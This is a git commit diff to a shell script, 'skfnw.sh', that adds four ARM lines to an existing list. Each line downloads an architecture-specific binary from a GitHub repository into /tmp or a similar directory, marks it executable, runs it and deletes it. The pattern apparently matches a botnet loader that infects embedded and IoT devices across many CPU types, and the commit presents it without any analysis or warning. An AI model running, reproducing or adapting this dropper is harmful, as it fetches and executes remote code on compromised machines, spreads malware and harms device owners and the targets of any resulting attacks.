e3766d9c3a15af7bc1a2ae88b675ec66cbf2fe18
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-10-22 03:47:01 +0500

    Update skfnw.sh

--- skfnw.sh
+++ skfnw.sh
@@ -2,6 +2,10 @@
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/mips; chmod +x mips; ./mips; rm -rf mips
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/sh4; chmod +x sh4; ./sh4; rm -rf sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/armv4l; chmod +x armv4l; ./armv4l; rm -rf armv4l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/armv5l; chmod +x armv5l; ./armv5l; rm -rf armv5l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/armv6l; chmod +x armv6l; ./armv6l; rm -rf armv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/armv7l; chmod +x armv7l; ./armv7l; rm -rf armv7l
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/powerpc; chmod +x powerpc; ./powerpc; rm -rf powerpc
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/i586; chmod +x i586; ./i586; rm -rf i586
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/m68k; chmod +x m68k; ./m68k; rm -rf m68k
